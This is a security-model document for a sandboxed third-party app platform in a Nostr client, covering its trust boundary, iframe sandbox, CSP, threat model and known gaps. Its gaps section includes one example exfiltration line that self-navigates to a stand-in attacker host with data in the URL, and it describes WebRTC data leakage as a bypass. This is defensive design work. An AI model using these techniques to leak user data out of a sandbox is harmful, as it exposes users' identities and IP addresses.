# Security model

## Trust boundary

**App code is untrusted. It's written by whoever can publish to a relay, and it runs inside a sandbox the host controls. The host (obelisk-dex) is trusted, and it's the only thing that holds keys, sockets and the user's data.**

```
 trusted                                           │ untrusted
                                                   │
 obelisk-dex origin                                │ frame (opaque origin "null")
  • signer: NIP-07 / nsec / NIP-46 session         │  • the app bundle
  • relay sockets, NIP-42 AUTH                     │  • @obelisk/apps-sdk (as bundled
  • chat, DMs, read state, localStorage            │    by the app's author, so also
  • host RPC server: builds and signs the fixed    │    untrusted)
    kind 2390 template, rate-limits, verifies      │
    bundle hashes                                  │
                        ◄──── MessagePort ────►    │
```

Everything that crosses the port from the right side is input to validate, including anything the SDK claims to have checked.

## What the sandbox guarantees

| Guarantee | Mechanism |
|---|---|
| No access to the host's storage, cookies, signer or DOM | `sandbox="allow-scripts"` **without** `allow-same-origin`. The frame's origin is opaque, so `parent.localStorage` and `parent.document` throw. |
| Can't sign arbitrary events | The app never sees a signer. `publish` takes `{op, content, n}` and the host builds kind 2390 with the session's own `h`/`e` tags. |
| Can't act outside its session | The `h` and `e` tags are fixed by the host from the session the frame was opened for. |
| Can't spam the relay without limit | A per-frame token bucket (20 deep, 5/s), a 64 KiB content cap, and one session per frame |
| No popups, top navigation, forms, pointer lock, downloads | Those `allow-*` sandbox tokens are absent |
| No camera, mic, geolocation, fullscreen, payment, USB… | `allow=""` (Permissions Policy denies every feature) |
| No `fetch`, XHR, WebSocket, EventSource, images from the network, fonts, `<link>` prefetch | The frame loader's CSP (below). Every byte the app shows came through the host as a Blob. |
| Runs exactly the code the session pinned | The host verifies each blob's sha256 against the `path` tags copied into the session's `create` event (app-format.md §2.1), and those tags against the aggregate `x` |
| An old app version can't be swapped in after a session starts | Same pin. A new manifest affects new sessions only. |
| Messages from other windows are ignored | Setup uses `window.postMessage` once, and the host checks `event.source === iframe.contentWindow`. After that, only the transferred `MessagePort` is used. |

### Frame loader CSP

This is served by `https://frame.obelisk.ar/v1/` on its own response, independent of dex's CSP:

```
default-src 'none';
script-src 'self' blob: 'wasm-unsafe-eval';
style-src 'self' 'unsafe-inline' blob:;
img-src data: blob:;
media-src data: blob:;
font-src data: blob:;
connect-src 'none';
form-action 'none';
base-uri 'none';
frame-ancestors https://obelisk.ar https://test.obelisk.ar tauri://localhost http://tauri.localhost http://localhost:3000;
```

- **No `'unsafe-eval'`:** bundles that rely on `eval` or `new Function` fail to load. This is deliberate; see [known-issues.md](known-issues.md).
- **`'wasm-unsafe-eval'` is allowed.** WebAssembly inside the sandbox reaches nothing more than JavaScript can.
- **Tauri origins:** `tauri://localhost` is the obelisk-tauri origin on macOS, and `http://tauri.localhost` on Android and Windows (Tauri v2).
- **`'unsafe-inline'` styles are allowed,** because every UI library needs them. Styles can't reach the network with `img-src` and `font-src` closed.

**On the dex side,** `src/proxy.ts` adds `https://frame.obelisk.ar` to `frame-src`, and nothing else changes. The frame origin is deliberately **not** `games.obelisk.ar`: the dashboard holds a signed-in session and must never share an origin with stranger code, even an opaque one.

## Threat model

| Adversary | Can | Cannot |
|---|---|---|
| **App author** (the main threat) | • Draw anything inside the frame, including a fake "sign in with your nsec" screen.<br>• Burn CPU and battery.<br>• Publish kind 2390 into sessions the user opened, within the limits.<br>• Keep what it's given: the session log, participants' names and avatars.<br>• Leak it through the gaps listed below. | • Read or use keys.<br>• Sign any other kind.<br>• Read chat, DMs, other sessions or other apps' storage.<br>• Make network requests (apart from the gaps). |
| **Co-player** | • Publish garbage, or stall by not moving.<br>• Collude with the host on seat order. | • Make an honest client accept an illegal move. Replay drops it (app-format.md §2.4, SDK turn kit). |
| **Relay** | • Withhold or delay events.<br>• Serve an older manifest.<br>• See who published what (it already does for chat). | • Forge events.<br>• Change a pinned bundle. |
| **Blossom server** | • Refuse to serve.<br>• Log the IP and the hash each client fetched. | • Serve modified code. The hash check fails and the host refuses it. |
| **A page embedding the frame loader** | • Run its own bundle in our loader. | • Anything more than it could do in its own sandbox. The loader rejects `boot` from origins not in its allowlist anyway. |

Social engineering is the part the sandbox can't solve. The host's defences against it:

- **Chrome outside the frame,** always visible: the app title and "by *name* · third-party app", drawn by the host.
- **Toasts** prefixed with the app's name.
- **No input the app can pre-fill** anywhere outside its frame.
- **The catalog shows the author** as NIP-05 or a short npub, never just the title.

## Gaps: what the sandbox does not stop

These are known and accepted for v1. Each one is also listed in [known-issues.md](known-issues.md).

1. **Self-navigation as a way to exfiltrate.** A sandboxed frame without `allow-top-navigation` can still navigate *itself*, for example `location = "https://evil.example/?d=" + data`. CSP has no working `navigate-to`.
   - The new page receives nothing more over the port, which dies with the old document.
   - But whatever the app put in the URL is sent, along with the user's IP.
   - The host sees a second `load` event on the iframe, tears the frame down and tells the user. By then the request has already gone out.
2. **WebRTC.** `RTCPeerConnection` is neither a sandbox token nor covered by `connect-src` in any shipping browser, so an app can reach a STUN or TURN server with data in the ICE credentials. There is no page-level fix. The `webrtc 'block'` CSP directive is specified but not shipped.
3. **CPU and memory abuse.** A busy loop or crypto miner runs until the user closes the modal. The host runs the frame only while the modal is open (no background frames), and a stall watchdog (the frame stops answering pings) offers a "stop this app" button.
4. **Phishing inside the frame.** The measures above reduce it but can't prevent it.
5. **Timing and side channels** between the frame and the host tab: the usual browser caveat.

**What could leak through gaps 1 and 2:** the session's events (visible to every channel member anyway, but possibly from a whitelisted relay that is otherwise closed), participants' pubkeys, names and avatars, the user's own pubkey, and the user's IP address. **Never:** keys, chat or DMs, other sessions, relay URLs (not given to the app), or storage outside the app's own namespace.

## Not exposed, and why

| Capability | Why it's not in v1 |
|---|---|
| Sign arbitrary events | A signer with any kind is the user's whole identity: it can post in chat, change the profile, follow and unfollow. There's no safe subset without per-kind user approval. |
| NIP-04/44 encrypt and decrypt | Decrypt access is DM access. Hidden-information games (cards) need it; see known-issues. |
| Zaps, NWC | Moves money. It needs an explicit per-payment confirmation designed first. |
| Read chat, members, relay list | Not needed by any v1 app, and each one is a new privacy surface. |
| Network | Every request leaks the user's IP and what they're doing, and bypasses the pin (fetched code is unpinned code). |
| Profile lookup for arbitrary pubkeys | It would turn the host into a way to look people up. Only session authors resolve. |

## Replay trust (inherited from obelisk-dex games)

- **Every client** replays the same `(created_at, id)`-sorted log through the same pinned code and drops what the rules reject.
- **No participant is a referee,** including the host of the table.
- **Rules live in the app:** the SDK's turn kit carries them over unchanged from `obelisk-dex/src/lib/games/session.ts`.

This model doesn't defend against:

- a player who stops publishing on a table with no turn clock;
- the table host choosing the seat order;
- hidden information, since everything is public;
- cheats in realtime games (Stacker), which are detected after the fact by replaying checkpoints, not prevented.

All four are in [known-issues.md](known-issues.md).

## Checklist for a host implementation

- [ ] The iframe has `sandbox="allow-scripts"` and nothing else, plus `allow=""` and `referrerpolicy="no-referrer"`.
- [ ] The first message is accepted only from `iframe.contentWindow`, and everything after it goes over the port.
- [ ] Kind, `h`, `e` and `t` are built by the host. The allowed `op` pattern is enforced, and the only extra tag is `n`.
- [ ] Rate and size limits are enforced host-side (the SDK's own limits don't count).
- [ ] Every blob is checked against its pinned sha256 before it's handed over. `create` is refused when the recomputed aggregate ≠ `x`.
- [ ] A second iframe `load` tears the frame down.
- [ ] No relay URL, group id, raw avatar URL or signer object crosses the port.
- [ ] The chrome, author label and toast prefix live outside the frame.
